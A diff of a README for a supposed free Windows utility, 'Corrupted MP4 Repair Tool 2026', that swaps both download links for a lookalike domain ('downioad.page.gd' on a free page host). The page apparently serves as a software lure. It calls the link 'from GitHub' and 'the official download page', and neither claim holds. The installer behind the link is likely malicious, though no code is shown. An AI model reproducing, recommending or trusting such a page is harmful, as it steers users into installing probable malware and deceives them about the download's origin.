@@ -2,7 +2,7 @@
 
 Corrupted MP4 Repair Tool 2026 is a lightweight and efficient Windows application designed to repair damaged or corrupted MP4 video files. Whether your videos are unplayable due to incomplete downloads, storage errors, or other issues, this tool can help recover them with ease. With a user-friendly interface and powerful repair algorithms, it's the go-to solution for fixing broken MP4 files in 2026. This free utility supports both Windows 10 and Windows 11, ensuring broad compatibility for users.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside – Key Features
 
@@ -59,7 +59,7 @@ The tool is updated periodically to add new features, improve repair algorithms,
 
 Ready to repair your corrupted MP4 files? Download the installer now:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link leads directly to the official download page. Ensure you download only from this source to avoid unofficial or tampered versions.
 
